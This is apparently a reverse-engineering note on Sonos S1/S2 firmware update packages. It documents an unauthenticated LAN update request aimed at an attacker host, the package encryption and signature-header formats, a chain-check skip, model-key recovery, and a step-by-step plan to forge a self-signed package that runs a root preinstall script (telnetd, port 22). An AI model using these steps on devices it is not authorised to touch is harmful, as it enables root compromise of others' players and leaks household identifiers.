# Update feed and package signature gate (S1 57.23, 2026-10-22)

Owner-directed RE. This extends the live update-path probe in
[`FIRMWARE_PATHS.md`](FIRMWARE_PATHS.md) with the direct-package path and the
signature gate's internals. No device identifiers or keys are committed.

## Feed primitive

`ZoneGroupTopology.BeginSoftwareUpdate` is unauthenticated on the LAN and
fetches any URL given in `UpdateURL`:

```http
POST /ZoneGroupTopology/Control HTTP/1.1
SOAPACTION: "urn:schemas-upnp-org:service:ZoneGroupTopology:1#BeginSoftwareUpdate"

<u:BeginSoftwareUpdate>
  <Flags>0</Flags>
  <UpdateURL>http://<attacker-host>:8080/pkg.upd</UpdateURL>
</u:BeginSoftwareUpdate>
```

The player appends its own query string to that URL:

```
?cmaj=57&cmin=23&cbld=<build>&subm=<submodel>&rev=1&reg=1
 &serial=<serial>&sonosid=<id>&householdid=<household>
```

so an arbitrary LAN host receives the model/build, serial, Sonos ID and
household ID. A `.upm` manifest is parsed as XML; a direct `.upd` is fetched
whole (an official 5.6 MB package completes) and handed to the root
`upgrade` process. Parsing happens **before** signature verification, so
unsigned packages are a pre-auth, root-context parser surface.

Invalid packages cause a reboot after the attempt but are not installed.
A signed 34.16 image is fetched but does not stick (minimum-compatible
version gate).

## Package shape

An `.upd` is a sequence of sections at offset 0, each `magic 497f1635`,
`u32 type`, `u32 total_length`, `u32 flags`, then `total_length - 16` payload
bytes (all little-endian). Relevant types: 1 version header (`u32 cmaj`,
`u32 cmin`, `u32 build`), 3 preinstall script, 4 rootfs, 6 kernel, 21
capabilities, 22 signature.

Component payloads (3/4/6 and the signature) are encrypted with a
`886499ca` envelope:

```
magic | u32 header_len | u32 00010000 | 8 zero bytes
u8 recipient_len | u8 03 | recipient bytes
u32 cipher_id=1 | u32 rsa_len | RSA-OAEP(SHA-1) AES key
u32 cipher_id=1 | u32 data_len | 16-byte IV + AES-CBC ciphertext
```

`header_len = 0x14 + 2 + recipient_len + 8 + rsa_len + 8`. The recipient is
the model key family; model-16 keys are recoverable from a plaintext 34.16
updater, so arbitrary sections can be re-encrypted for the owner's ZPS5
players.

## Signature gate

After the sections are read, `upgrade` calls `ZZ0121` on the type-22 payload
and then `ZZ0124` to verify. The type-22 payload is a **364-byte header**
(the updater reads `header_len = 0x16c`, little-endian as a `u32` at +4)
followed by a 149 KB `rcbundle` (trusted-root Name bundle, magic `rcbundle`,
rootfs fallback `/etc/fallback_trusted_roots.rcb`).

The 364-byte header is a custom TLV, not ASN.1:

- `u32` magic `621da74d`, `u32 header_len`, `u16` version 1, `u16` field;
- two `u32` lists of typed records (each record parsed by `ZZ0026`);
- `u8` certificate count, then per entry: `u32 name_len <= 0x7ff`, a
  certificate **Name** (X.509 RDNSequence, not a whole certificate), a key
  type byte, a `u32`, `u32 key_len <= 0x100`, and a raw key blob. Entries are
  laid out in `0x910` slots; two maximum entries fill the `0x22c0` struct
  exactly, so the layout is intentional;
- a 33-byte `alg + digest` field, algorithm ids, a `0x100`-byte signature,
  and the literal `rcbundle`.

`ZZ0126` verifies the certificate Name with a caller callback and then
verifies the digest signature with the entry's key. A header whose **second
list count is 0** skips the post-loop chain check entirely, so the entry is
verified only against itself; the wire fields and the exact ordering are in
the next section. `ZZ0124`/`ZZ0125` do the policy checks;
`ZZ0118`/`ZZ0119`/`ZZ0120` validate key type, signature algorithm and a
constant field.

Section dispatch puts the real work on **type 17 (`application`)**, not type
22: the handler table maps `0x11` to `0x1000868c`, which reads only
`section_len - 16` and runs `ZZ0121`/`ZZ0124`. Its verify call uses a
**fixed 32-byte expected digest copied from `DAT_1002c564`**, not a digest
read from the package, plus algorithm 1 and length 0x20. Type 22 is a
model-independent rcbundle container (364-byte header + 149 KB bundle) and
is shared byte-for-byte between models. Component sections have no obvious
per-component digest; only the rcbundle/application fields are signed.

The `.upd` signature blob is 256 bytes (RSA-2048). `upgradekey.pub` is a raw
2048-bit public key, so it is the likely `.upd` verifier; UPM signatures are
a separate, 128-byte/1024-bit scheme. A `pow(sig, e, n)` check against the
header did not yield PKCS#1 padding at the offset assumed here, so the exact
signature slice and key mapping still need confirmation.

An unsigned package does **not** run the type-3 preinstall, even when the
section is correctly encrypted to the model key and the package carries a
copied signature section. Confirmed with a `wget` callback and by starting
`telnetd` from the script. Not bypassed by:

- `Flags` 0..31 plus 256/4096/65536/2^31/2^32-1;
- `ExtraOptions` guesses (`bForceUpdate=1`, `force=1`, updater flags
  `-X`, `-Y`, `-n`, `-F`, `-f`, `-s`, combinations);
- keeping the old signature while modifying only the preinstall;
- a signed older package.

## Rootfs repack (for when a signature exists)

The 57.23 kernel mounts **squashfs 3.0 only**; `mksquashfs` 4.x images do
not boot, and even 3.4/v3.1 output matches the superblock less closely.
Use the **3.0 source**, which after glibc fixes produces a superblock
byte-identical to the original apart from timestamps and offsets. Build on a
modern glibc with:

```
CFLAGS="-I. -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -D_GNU_SOURCE \
 -O2 -std=gnu89 -fgnu89-inline -fcommon -include sys/sysmacros.h"
make mksquashfs
```

Use `mksquashfs <dir> rootfs.bin -be -all-root -noappend -b 65536`. A
one-byte `VERSION` edit survives and the image remains exactly the original
4,571,136 bytes with version 3.0 and flags 0x40. A patched image and package
are kept locally under `captures/firmware/`.

## Negative results

- Unsigned `.upm` manifests are fetched and parsed but never lead to an
  image fetch; the manifest signature is enforced.
- An unsigned `.upd` is fetched and parsed, then rejected; the reboot is
  unconditional, not a sign of installation.
- The kernel rejects squashfs 4.x; v3.0 is required.

## Live install trials (unsigned)

Four patched-rootfs packages were fed to a bench player; all were fetched in
full and caused a reboot, and every one returned to the old rootfs:

- v3.1 image (3.4-built, minor patched to 0): fell back to the old rootfs
  after roughly four minutes;
- true v3.0 image (3.0-built, exact superblock): rebooted, came back briefly
  ping-only with no TCP services, then reboot-looped, and finally fell back;
- same image with `VERSION` given its original trailing newline: fell back;
- same image with a realistic build bump (`57.23-74171` instead of 99020):
  fell back.

The ping-only window is not a successful boot; anacapad never served. So the
reboots are not installs, and the gate is above the image format. The most
likely remaining blocker is the type-17 application verification; the
component bytes themselves are not covered by the model-independent type-22
rcbundle.

## Header layout, decoded (libsonoscrypto / librcb)

Artifacts (public, from `anacapad-internals`): `lib/libsonoscrypto.so.3`
(sha256 `7ba2531b9c5921e4…`) exports `ZZ0121` (header parser, `0x9e14`),
`ZZ0125` (`0xa384`, per-entry verify loop), `ZZ0126` (`0xa618`),
`ZZ0109` (`0x8ec4`, actual RSA verify), `ZZ0118/0119/0120` (validators) and
`ZZ0026` (`0x3fd4`, typed-record copier). `lib/libsonos-root-cert-bundle.so.2`
(sha256 `4cd8ae0486d1d68f…`) exports `sonosRcbParseHeader`/`sonosRcbVerifySig`.
Both are PPC and readable; the layouts below come from their code, not from
guessing.

The 364-byte header is a TLV, exactly:

```
0x00 u32 magic 621da74d      0x04 u32 header_len (0x16c)
0x08 u16 version == 1        0x0a u16 field
0x0c u32 list1 count <= 8    0x10 u32 list2 count <= 8
0x14 list2 records, then list1 records (each: u32 type, u32 len <= 0x40
     unless (type>>1)==5, then u32 type + 4-byte value + u32 value2)
```

then, in order:

```
u8 cert_count (1 or 2), then per entry:
   u32 name_len <= 0x7ff
   u8  keytype (1..4, ZZ0119)
   name[name_len]                      (opaque id, not DER)
   u8  sig_alg (1..4, ZZ0118)
   u32 field (== 1, ZZ0120)
   u32 sig_len (0x100)
   sig[sig_len]                        (RSA-2048 signature)
```

All of it must fit `header_len`; the parser rejects any overrun. Field
lengths map to digest sizes 1→32, 2→16, 3→20, 4→28, and the signature length
must equal the hash length implied by the *entry's* alg. In the shipped
type-22 header the records are: type 2 (`alg 1` + 32-byte digest), type 3
(4-byte value), then `cert_count = 1`, `name_len = 20`, `keytype = 3`,
`sig_alg = 1`, `field = 1`, `sig_len = 0x100` and 256 bytes ending exactly
at `header_len`.

`ZZ0125` runs this per entry: the **name callback** (`ZZ0039` in `upgrade`)
resolves the Name to a key handle, then `ZZ0109` verifies the 256-byte
signature over the digest against that key. With `list2 count == 0` the
post-loop chain check is skipped (`0xa60c`), so a header that carries no
second list is verified only against the entry itself. Type-22 additionally
appends `rcbundle\0<version>\0<pad>` plus the DER cert table; `upgrade`
installs it to `/jffs/sys/run/rcb/<name>` **before** the type-3 script is
written, which is how a bundle can supply the key that type 17 then needs.

Types 17 and 22 are stored **in plaintext** (magic `621da74d` at offset 0 of
the payload). Types 3, 4 and 6 are wrapped in the `886499ca` envelope, and
all three of one package share the same wrapped AES key:
```
886499ca | u32 header_len (0x13a) | u32 00010000 | 8 * 00
u8 recipient_len | u8 03 | recipient | u32 00000001 | u32 rsa_len
RSA-OAEP(SHA-1) AES key | u32 00000001 | u32 data_len | 16-byte IV | ciphertext
```

so **editing the preinstall script on this line also means re-encrypting it**
to the model key; the plaintext-script edits in the earlier trials could
never be read.

**What the digest covers.** For the type-22 section the 32-byte digest is
exactly `SHA-256` of the section's own bundle bytes (everything after the
364-byte header) — verified against the shipped package. The type-17 digest
is *not* the bundle, the encrypted sections, its own header or any prefix
tried; it is signed separately and is still unresolved. So a forged type-22
needs `digest = SHA-256(our bundle)` plus a signature over that digest, and
a forged type-17 would need its own, separate value.

**Name resolution.** `ZZ0039` accepts only `keytype == 3` and a **20-byte**
name, then `memcmp`s it against a store of 20-byte names (stride `0x20`)
built from the parsed bundle and returns a key handle; anything else is
rejected before any crypto runs. An entry therefore verifies only if its
name is present in the bundle that type 22 just installed, so the bundle is
the trust material and the same 20-byte id must appear in both headers.



## 86.10 / S2 delta

The S2 line (PPC, 86.10) uses a different container layout. A stock
86.10-80260-1-9 package is ordered:

```
1 (28) | 21 (144) | 2 (44) | 2 (148) | 2 (44) | 22 (149527)
       | 3 (1946) | 6 | 4 | 13 | 17 (380)
```

with no `ffffffff` trailer. Type 21 is a plain-text capability list; type 22
is the rcbundle container (364-byte `621da74d` header + 149 KB bundle) and is
placed **before** the type-3 script, so verification can gate script
execution structurally on this line. Type 13 is an `886499ca` envelope, type
17 the `application`/verify section, whose handler is `0x1000868c` in the PPC
`upgrade`. The gate internals above are unchanged; only the dispatch order and
the added types differ.

Transfer behaviour measured against a plain Python HTTP server: the player's
`wget -qC <url> -T 300 -O - -` stops after exactly 131072 bytes and resets
the connection for any package larger than 128 KiB -- on S2 and on S1, for a
pristine signed package as well as a modified one. A feed throttled to about
2 KB/s reaches the same byte count after 55 s, so it is not the timeout.
Packages below 128 KiB download completely. HTTP status is always 200; the
server-side sent-byte counter is the only reliable oracle.

A correctly ordered, completely downloaded 2.3 KB package
(records 1/21/2/2/2/3) still did not execute the type-3 script: probe writes
to `/tmp` and `/jffs` never appeared. That matches the S1 result -- unsigned
packages never reach the script -- and narrows it to the same gate rather
than to section size, order, or section encoding.

## Next

1. Recover the **model public key** for the target player from the encrypted
   rootfs (or from a plaintext 34.16-era updater, whose model-16 table the
   older line still carries), then reproduce the `886499ca` envelope for an
   edited type-3 script: generate an AES key, RSA-OAEP it to that model key,
   AES-CBC the script, and keep `header_len = 0x14 + 2 + recipient_len + 8 +
   rsa_len + 8`, `data_len` and a random 16-byte IV exact.
2. Build a self-signed `rcbundle`: keep the shipped structure, replace the
   cert with our own, and name it with a 20-byte id we choose. Header for it:
   `list2 count = 0`, `cert_count = 1`, our name, `keytype` from the key
   family, `sig_alg = 1`, `field = 1`, `sig_len = 0x100`. Which key type
   (`1..4`) maps to RSA must be read out of `ZZ0109` (`0x8ec4`) first — it
   accepts only `keytype == 1` on the path shown.
3. Sign the header's 32-byte digest with our key (PKCS#1 v1.5) and place the
   signature in the `sig_len` field. Then determine what the digest covers:
   `upgrade` finalises it into `sp+9036` via `ZZ0059` + `ZZ0061`, so it is a
   hash state carried in the parsed struct — either the header prefix or the
   DER of the signer key (`ZZ0152` hashes exactly that); test both.
4. Send the package and watch for the type-3 probe (`/tmp` marker, then
   `/jffs/system/Configure.dev` and port 22), using the byte-counting server
   because every package larger than 128 KiB dies at 131072 bytes.
5. Local PPC execution is blocked: `qemu-ppc` user emulation (7.2 and 11.1,
   arm64 and amd64 hosts) segfaults on every rootfs binary. `qemu-system-ppc`
   or a PPC cross-build of `upgrade` remains the best oracle for iterating
   the header without burning reboots on a live player.
6. With a valid signature, the patched image should install and expose a
   changed `/status/VERSION`.
